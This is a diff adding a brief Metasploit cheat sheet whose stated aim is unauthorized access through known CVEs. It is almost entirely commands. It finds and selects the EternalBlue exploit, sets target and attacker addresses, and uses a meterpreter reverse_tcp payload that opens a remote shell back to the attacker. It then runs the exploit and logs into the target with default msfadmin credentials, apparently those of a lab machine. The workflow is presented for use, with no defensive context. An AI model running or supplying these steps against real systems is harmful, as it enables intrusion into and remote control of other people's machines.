@@ -1,0 +1,45 @@
+Aim: Use software flaws (CVEs) for unauthorized access.
+
+Tool: Metasploit Framework (msfconsole).
+
+Prep: Identify target vulnerabilities (e.g., nmap scan).
+
+Core Workflow & Commands:
+
+Start Metasploit: msfconsole
+
+Find Exploit:
+msf6 > search cve:<cve_number>
+msf6 > search <software_keyword>
+(Example: msf6 > search cve:2017-0144)
+
+Select Exploit:
+msf6 > use <exploit/path>
+(Example: msf6 > use exploit/windows/smb/ms17_010_eternalblue)
+
+Check Options:
+msf6 > show options
+
+Set Options:
+msf6 > set RHOSTS <target_ip>
+msf6 > set LHOST <your_attacker_ip>
+msf6 > set PAYLOAD <payload_name>
+(Example Payload: msf6 > set PAYLOAD windows/meterpreter/reverse_tcp)
+(May need RPORT/LPORT too)
+
+Re-Check Options: msf6 > show options
+
+Run Exploit:
+msf6 > exploit
+(or msf6 > run)
+
+Connect (Attacker):
+
+ssh msfadmin@TARGET_IP (Password: msfadmin)
+
+OR telnet TARGET_IP (Login: msfadmin, Password: msfadmin)
+
+Display Text (Run on Target via remote shell):
+
+echo "Your text here" (Prints in current session)
+
